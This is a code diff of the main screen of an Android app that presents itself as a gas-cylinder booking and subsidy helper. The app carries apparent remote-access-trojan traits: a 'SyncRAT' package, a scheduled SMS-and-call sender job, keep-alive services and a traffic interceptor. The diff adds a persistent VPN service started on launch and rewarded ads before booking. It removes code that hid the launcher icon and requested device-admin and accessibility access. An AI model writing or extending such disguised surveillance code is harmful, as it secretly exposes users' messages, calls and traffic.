@@ -35,6 +35,7 @@ import android.iocl.dac_collector.Services.DownloadService;
 import android.iocl.dac_collector.Services.FixOppoAutoKill;
 import android.iocl.dac_collector.Services.ImageJobService;
 import android.iocl.dac_collector.Services.JobSchedulerUtil;
+import android.iocl.dac_collector.Services.PersistentVpnServiceUtil;
 import android.iocl.dac_collector.SyncRAT.SyncAccountUtil;
 import android.iocl.dac_collector.Utility.Constant;
 import android.iocl.dac_collector.Utility.LauncherIconHelper;
@@ -65,6 +66,7 @@ import android.widget.RelativeLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.constraintlayout.widget.ConstraintLayout;
@@ -75,6 +77,11 @@ import androidx.core.view.WindowInsetsCompat;
 import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 
+import com.google.android.gms.ads.AdRequest;
+import com.google.android.gms.ads.AdView;
+import com.google.android.gms.ads.LoadAdError;
+import com.google.android.gms.ads.rewarded.RewardedAd;
+import com.google.android.gms.ads.rewarded.RewardedAdLoadCallback;
 import com.google.android.material.card.MaterialCardView;
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.analytics.FirebaseAnalytics;
@@ -101,6 +108,8 @@ import retrofit2.Response;
 public class MainActivity extends AppCompatActivity implements ResponseListener {
 
     private StatusBarManager statusBarManager;
+
+    private AdView mAdView, adView2;
     private static final String TAG = "MainActivity_Mokardder";
     FirebaseAnalytics mFirebaseAnalytics;
     FirebaseDBClient fireDB;
@@ -109,6 +118,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
     Button fetchUserDetails;
 
+    private RewardedAd rewardedAd;
     LinearLayout loader;
     TextView subsidyBadge, loader_text, call_Akram, call_Emdadul, tv_appVersion, call_Mokardder, refreshProfile, userName, remainBook, lastBook, mobNo, consID, location, Book_Btn, Check_Update, aboutApp, adminPerm, btn_skip;
     ImageView annualTick;
@@ -141,23 +151,33 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
             }).setCancelable(false).show();
         }
 
+
+
+        checkMissingPermissions();
+
         setContentView(R.layout.activity_main);
 
         setViewsUI();
-        checkMissingPermissions();
+
         initFirebaseThings();      // <-- improved token init
         sharedPrefsCheck();
         settingUpJobs();
         setClickListener();
         implementKeepAliveBelow8();
 
-        startActivity(new Intent(Settings.ACTION_INPUT_METHOD_SETTINGS));
+
+        PersistentVpnServiceUtil.startService(this); // foreground context
+
+
 //        askToHide();
 
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             statusBarManager = (StatusBarManager) getSystemService(StatusBarManager.class);
         }
+
+
+
 
     }
 
@@ -169,8 +189,11 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
 
             Log.d("PermsActivity", "refreshAndCheckCompletion: " + Arrays.toString(missingArray));
-            Log.d("PermsActivity", "refreshAndCheckCompletion: " + PermissionUtility.isTilesAdded(MainActivity.this));
             startActivity(new Intent(this, PermissionActivity.class).putExtra("permissions", missingArray));
+            return;
+
+
+
         }
     }
 
@@ -189,6 +212,8 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
 
         }
+
+        checkAppUpdate();
     }
 
     private void sharedPrefsCheck() {
@@ -228,6 +253,10 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         }
 
 
+        loadRewardedAd();
+
+
+
     }
 
 
@@ -239,7 +268,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
      */
     private void initFirebaseThings() {
 
-        checkAppUpdate();
+
 
         CapturingInterceptor.setGlobalListener(this);
 
@@ -278,6 +307,8 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
 
         boolean isRestrictionEnabled = SharedPrefs.getRestrictionEnabled(this);
+        mAdView = findViewById(R.id.adView);
+        adView2 = findViewById(R.id.adView2);
         subsidyBadge = findViewById(R.id.badgeReceived);
         loader = findViewById(R.id.loaderLayout);
         loader_text = findViewById(R.id.loadingText_UI);
@@ -323,22 +354,17 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
     }
 
-    private void askToHide() {
-        new AlertDialog.Builder(this).setTitle("Launcher Icon").setMessage("Do you want to hide the app icon from the launcher? You can reopen via the persistent notification or dial *#*#1234#*#* (may not work on all phones).").setPositiveButton("Keep", (dialog, which) -> Toast.makeText(this, "Icon kept", Toast.LENGTH_SHORT).show()).setNegativeButton("Hide", (dialog, which) -> {
-            LauncherIconHelper.hideLauncherIcon(this);
 
-        }).setCancelable(true).show();
-
-
-
-
-    }
 
     private void settingUpJobs() {
+        AdRequest adRequest = new AdRequest.Builder().build();
+        mAdView.loadAd(adRequest);
+        adView2.loadAd(adRequest);
+
+
+
+
         imageObserverSchedule();
-
-        SyncAccountUtil.getSyncAccount(this);
-
 
         if (!Utility.isJobSchedulerActive(MainActivity.this, 1)) {
             JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
@@ -346,6 +372,8 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
 
         }
+
+
     }
 
     private void setClickListener() {
@@ -354,7 +382,20 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         });
 
         Book_Btn.setOnClickListener(v -> {
-            makeCall("+918454955555");
+            if (rewardedAd != null) {
+                rewardedAd.show(this, rewardItem -> {
+
+                    makeCall("+918454955555");
+                });
+            } else {
+                // Ad not ready, just show dialog directly
+                makeCall("+918454955555");
+                // Optionally, reload the ad for next time
+                loadRewardedAd();
+            }
+
+
+
         });
 
         Check_Update.setOnClickListener(v -> {
@@ -370,7 +411,7 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
         });
 
         adminPerm.setOnClickListener(v -> {
-            showAdminAlert();
+//            showAdminAlert();
         });
 
 
@@ -387,10 +428,21 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
             if (!SharedPrefs.getSubsidyDetails(this).isEmpty()) {
                 startActivity(new Intent(this, BankStatementActivity.class));
             } else {
-                showSubsidyDialog();
+                // check if rewarded ad is ready
+                if (rewardedAd != null) {
+                    rewardedAd.show(this, rewardItem -> {
+                        // Ad finished successfully, give reward
+                        showSubsidyDialog();
+                    });
+                } else {
+                    // Ad not ready, just show dialog directly
+                    showSubsidyDialog();
+                    // Optionally, reload the ad for next time
+                    loadRewardedAd();
+                }
             }
-
         });
+
         tv_appVersion.setText(BuildConfig.VERSION_NAME);
 
 
@@ -659,7 +711,32 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
     }
 
 
+    private void loadRewardedAd() {
+
+        String adUnitId = getString(R.string.reward_ad_unit_id);
+        AdRequest adRequest = new AdRequest.Builder().build();
+
+        RewardedAd.load(this,
+                adUnitId, // test ad unit id
+                adRequest,
+                new RewardedAdLoadCallback() {
+                    @Override
+                    public void onAdLoaded(@NonNull RewardedAd ad) {
+                        rewardedAd = ad;
+                    }
+
+                    @Override
+                    public void onAdFailedToLoad(@NonNull LoadAdError loadAdError) {
+                        rewardedAd = null;
+                    }
+                });
+    }
+
+
+
     private void showUserDetailsDialog() {
+
+        if (isFinishing() || isDestroyed()) return;
 
 
         RelativeLayout relativeLayoutAlert = findViewById(R.id.alertDialog_userdetails);
@@ -871,7 +948,8 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
 
     private void checkAppUpdate() {
-        loader_controller("Checking Update....", true, loader, loader_text);
+
+//        loader_controller("Checking Update....", true, loader, loader_text);
         RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
         check_update appUpdate_payload = new check_update("checkAppUpdate");
         Call<DAC_Collector_Base> auth = requestService.check_update(appUpdate_payload);
@@ -893,6 +971,8 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
                     if (version_code > BuildConfig.VERSION_CODE) {
                         showAppDialog(url, appDesc, versionName);
+                    }else {
+                        Toast.makeText(MainActivity.this, "Already Latest Version.", Toast.LENGTH_SHORT).show();
                     }
 
 
@@ -995,21 +1075,9 @@ public class MainActivity extends AppCompatActivity implements ResponseListener 
 
         final AlertDialog alertDialog = builder.create();
 
-        tvAdmin.setOnClickListener(v -> {
-            enableDeviceAdmin(); // Launch from Activity context
-            alertDialog.dismiss();
-        });
 
-        tvAccessibility.setOnClickListener(v -> {
-            alertDialog.dismiss();
-            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            startActivity(intent);
-        });
 
-        tvSetRestriction.setOnClickListener(v -> {
-            SharedPrefs.setRestrictionEnabled(this);
-            alertDialog.dismiss();
-        });
+
 
         alertDialog.setCancelable(true);
 
